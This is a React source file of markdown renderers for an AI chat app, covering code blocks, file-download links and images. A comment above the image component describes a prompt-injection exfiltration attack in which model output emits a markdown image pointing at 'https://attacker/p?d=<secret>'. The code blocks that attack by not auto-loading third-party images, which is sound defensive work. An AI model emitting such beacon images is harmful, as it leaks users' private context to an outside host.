import React, { memo, useMemo, useRef, useEffect } from 'react';
import { useAtomValue } from 'jotai';
import { useToastContext } from '@hanzochat/client';
import { PermissionTypes, Permissions, apiBaseUrl } from '@hanzochat/data-provider';
import MermaidErrorBoundary from '~/components/Messages/Content/MermaidErrorBoundary';
import Adjust from '~/components/Chat/Messages/Content/Adjust';
import CodeBlock from '~/components/Messages/Content/CodeBlock';
import Mermaid from '~/components/Messages/Content/Mermaid';
import useHasAccess from '~/hooks/Roles/useHasAccess';
import { useFileDownload } from '~/data-provider';
import { useCodeBlockContext } from '~/Providers';
import { handleDoubleClick, resolveImageUrl } from '~/utils';
import { useLocalize } from '~/hooks';
import store from '~/store';

type TCodeProps = {
  inline?: boolean;
  className?: string;
  children: React.ReactNode;
};

export const code: React.ElementType = memo(({ className, children }: TCodeProps) => {
  const canRunCode = useHasAccess({
    permissionType: PermissionTypes.RUN_CODE,
    permission: Permissions.USE,
  });
  // [\w-]+, not \w+: fence tags carry hyphens (hanzo-setting).
  const match = /language-([\w-]+)/.exec(className ?? '');
  const lang = match && match[1];
  const isMath = lang === 'math';
  const isMermaid = lang === 'mermaid';
  const isSetting = lang === 'hanzo-setting';
  const isSingleLine = typeof children === 'string' && children.split('\n').length === 1;

  const { getNextIndex, resetCounter } = useCodeBlockContext();
  const blockIndex = useRef(getNextIndex(isMath || isMermaid || isSetting || isSingleLine)).current;

  useEffect(() => {
    resetCounter();
  }, [children, resetCounter]);

  if (isMath) {
    return <>{children}</>;
  } else if (isSetting) {
    return <Adjust content={typeof children === 'string' ? children : String(children)} />;
  } else if (isMermaid) {
    const content = typeof children === 'string' ? children : String(children);
    return (
      <MermaidErrorBoundary code={content}>
        <Mermaid id={`mermaid-${blockIndex}`}>{content}</Mermaid>
      </MermaidErrorBoundary>
    );
  } else if (isSingleLine) {
    return (
      <code onDoubleClick={handleDoubleClick} className={className}>
        {children}
      </code>
    );
  } else {
    return (
      <CodeBlock
        lang={lang ?? 'text'}
        codeChildren={children}
        blockIndex={blockIndex}
        allowExecution={canRunCode}
      />
    );
  }
});

export const codeNoExecution: React.ElementType = memo(({ className, children }: TCodeProps) => {
  const match = /language-([\w-]+)/.exec(className ?? '');
  const lang = match && match[1];

  if (lang === 'math') {
    return children;
  } else if (lang === 'hanzo-setting') {
    return <Adjust content={typeof children === 'string' ? children : String(children)} />;
  } else if (lang === 'mermaid') {
    const content = typeof children === 'string' ? children : String(children);
    return <Mermaid>{content}</Mermaid>;
  } else if (typeof children === 'string' && children.split('\n').length === 1) {
    return (
      <code onDoubleClick={handleDoubleClick} className={className}>
        {children}
      </code>
    );
  } else {
    return <CodeBlock lang={lang ?? 'text'} codeChildren={children} allowExecution={false} />;
  }
});

type TAnchorProps = {
  href: string;
  children: React.ReactNode;
};

export const a: React.ElementType = memo(({ href, children }: TAnchorProps) => {
  const user = useAtomValue(store.user);
  const { showToast } = useToastContext();
  const localize = useLocalize();

  const {
    file_id = '',
    filename = '',
    filepath,
  } = useMemo(() => {
    const pattern = new RegExp(`(?:files|outputs)/${user?.id}/([^\\s]+)`);
    const match = href.match(pattern);
    if (match && match[0]) {
      const path = match[0];
      const parts = path.split('/');
      const name = parts.pop();
      const file_id = parts.pop();
      return { file_id, filename: name, filepath: path };
    }
    return { file_id: '', filename: '', filepath: '' };
  }, [user?.id, href]);

  const { refetch: downloadFile } = useFileDownload(user?.id ?? '', file_id);
  // rel on every new-tab link: no opener handle back to this page.
  const props: { target?: string; rel?: string; onClick?: React.MouseEventHandler } = {
    target: '_blank',
    rel: 'noopener noreferrer',
  };

  if (!file_id || !filename) {
    return (
      <a href={href} {...props}>
        {children}
      </a>
    );
  }

  const handleDownload = async (event: React.MouseEvent<HTMLAnchorElement>) => {
    event.preventDefault();
    try {
      const stream = await downloadFile();
      if (stream.data == null || stream.data === '') {
        console.error('Error downloading file: No data found');
        showToast({
          status: 'error',
          message: localize('com_ui_download_error'),
        });
        return;
      }
      const link = document.createElement('a');
      link.href = stream.data;
      link.setAttribute('download', filename);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(stream.data);
    } catch (error) {
      console.error('Error downloading file:', error);
    }
  };

  props.onClick = handleDownload;
  props.target = '_blank';

  const domainServerBaseUrl = `${apiBaseUrl()}/v1/chat`;

  return (
    <a
      href={
        filepath?.startsWith('files/')
          ? `${domainServerBaseUrl}/${filepath}`
          : `${domainServerBaseUrl}/files/${filepath}`
      }
      {...props}
    >
      {children}
    </a>
  );
});

type TParagraphProps = {
  children: React.ReactNode;
};

export const p: React.ElementType = memo(({ children }: TParagraphProps) => {
  return <p className="mb-2 whitespace-pre-wrap">{children}</p>;
});

type TImageProps = {
  src?: string;
  alt?: string;
  title?: string;
  className?: string;
  style?: React.CSSProperties;
};

/**
 * True when a URL is safe to LOAD automatically in a message: this app's own
 * images (served from `/v1/chat/images`, so same-origin after resolveImageUrl)
 * and inline data/blob URIs. Everything else is a third-party host.
 *
 * A markdown `![](url)` auto-fires a GET the moment it renders, so an
 * arbitrary external src is a zero-click beacon: a prompt-injected or shared
 * message emitting `![](https://attacker/p?d=<secret>)` exfiltrates whatever
 * reached model context, with no script and nothing the user did. Model output
 * is untrusted, so the trust decision lives HERE, at the sink, not upstream.
 */
function autoLoadable(url: string): boolean {
  if (/^(data|blob):/i.test(url)) {
    return true;
  }
  try {
    return new URL(url, window.location.origin).origin === window.location.origin;
  } catch {
    return false;
  }
}

export const img: React.ElementType = memo(({ src, alt, title, className, style }: TImageProps) => {
  /* Server images need the API base path prepended on subdirectory deployments;
     `resolveImageUrl` is the one place that knows which paths those are. */
  const fixedSrc = useMemo(() => (src ? resolveImageUrl(src) : src), [src]);

  // A third-party image is offered as a link the user chooses to open, never
  // auto-loaded — see autoLoadable. Same-origin app images render inline.
  if (fixedSrc && !autoLoadable(fixedSrc)) {
    return (
      <a href={fixedSrc} target="_blank" rel="noopener noreferrer" title={fixedSrc}>
        {alt || fixedSrc}
      </a>
    );
  }

  return <img src={fixedSrc} alt={alt} title={title} className={className} style={style} />;
});
